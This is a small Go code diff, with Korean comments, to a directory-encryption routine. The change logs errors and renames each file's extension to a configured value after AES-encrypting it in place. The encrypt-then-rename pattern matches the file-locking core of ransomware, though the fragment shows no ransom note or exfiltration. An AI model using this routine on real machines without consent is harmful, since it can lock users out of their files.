@@ -61,11 +61,17 @@ func (c *Client) AESEncryptDirectory(rootPath string) error {
 					//fmt.Printf("Path: %s, IsDir: %v, Name: %v\n", path, info.IsDir(), info.Name())
 					// 파일을 암호화
 					if err = encrypt.EncryptFile(path, []byte(c.Key)); err != nil {
-						fmt.Printf("error encrypting %s: %v\n", path, err)
+						log.Printf("error encrypting %s: %v\n", path, err)
 						return err
+					} else { // 암호화 성공시 확장자 변경
+						if err = c.ChangeFileExtension(path); err != nil {
+							log.Printf("error changing %s: %v\n", path, err)
+							return err
+						}
+						fmt.Println(path, "에 대해 암호화를 성공하였습니다.")
+						fmt.Println(path, "에 대해 .", c.config.Extensions.NewExt, "로 확장자 변경을 성공하였습니다.")
+						break
 					}
-					fmt.Println(path, "에 대해 암호화를 성공하였습니다.")
-					break
 				}
 			}
 		}
